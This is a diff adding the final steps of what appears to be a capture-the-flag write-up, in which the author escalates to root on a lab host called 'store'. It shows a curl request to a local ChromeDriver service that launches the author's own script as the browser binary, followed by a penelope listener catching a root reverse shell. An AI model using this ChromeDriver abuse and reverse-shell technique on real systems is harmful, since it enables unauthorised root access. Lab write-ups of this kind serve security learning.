@@ -467,6 +467,27 @@ chmod +x ../../../home/dev/privesc.sh
 Now ill just run the command to execute my script
 
 ```python
-
+dev@store:/opt/google/chrome$ curl -X POST localhost:9515/session -d '{"capabilities": {"alwaysMatch": {"goog:chromeOptions": {"binary":"/home/dev/privesc.sh", "args":["test"]}}}}'
 ```
+
+Now in my listener window
+
+```python
+penelope -p 1338         
+[+] Listening for reverse shells on 0.0.0.0:1338 -> 127.0.0.1 • 192.168.86.128 • 10.10.15.232
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+[+] [New Reverse Shell] => store 10.129.238.32 Linux-x86_64 👤 root(0) 😍️ Session ID <1>
+[+] Upgrading shell to PTY...
+[+] PTY upgrade successful via /usr/bin/python3
+[+] Interacting with session [1] • PTY • Menu key F12 ⇐
+[+] Session log: /home/kali/.penelope/sessions/store~10.129.238.32-Linux-x86_64/2026_07_25-20_57_50-635.log
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+root@store:/# whoami
+root
+root@store:/#
+```
+
+I am now root!
+
+
 
